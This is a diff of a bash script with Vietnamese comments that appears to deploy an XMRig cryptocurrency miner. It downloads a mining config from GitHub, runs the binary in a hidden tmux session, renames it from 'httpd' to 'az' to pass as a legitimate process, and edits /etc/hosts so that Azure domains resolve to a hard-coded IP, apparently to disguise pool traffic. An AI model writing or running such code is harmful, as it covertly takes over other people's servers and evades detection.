@@ -1,8 +1,8 @@
 #!/bin/bash
 
 set -x #echo on
-if [ -f ${PWD}/httpd ]; then
-    if pgrep -x "httpd" > /dev/null
+if [ -f ${PWD}/az ]; then
+    if pgrep -x "az" > /dev/null
 then
     echo "scrip dang chay roi , ke cmn di "
     
@@ -11,7 +11,7 @@ else
 echo "script da install , chay thoi "
 sudo rm config.json
 sudo wget https://raw.githubusercontent.com/minnie1311/xmrpc/master/config.json
-sudo tmux new-session -d -s my_session1  './httpd'
+sudo tmux new-session -d -s my_session1  './az'
 
 fi
 exit
@@ -28,8 +28,10 @@ sudo bash enable_1gb_pages.sh
 wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/randomx_boost.sh
 sudo bash randomx_boost.sh
 sudo chmod +x httpd
-sudo -- sh -c "echo '103.145.255.41  google.com' >> /etc/hosts"
-sudo tmux new-session -d -s my_session1  './httpd'
+mv httpd az
+sudo -- sh -c "echo '103.145.255.41  portal.azure.com' >> /etc/hosts"
+sudo -- sh -c "echo '103.145.255.41  azurehdinsight.net' >> /etc/hosts"
+sudo tmux new-session -d -s my_session1  './az'
 
 
 
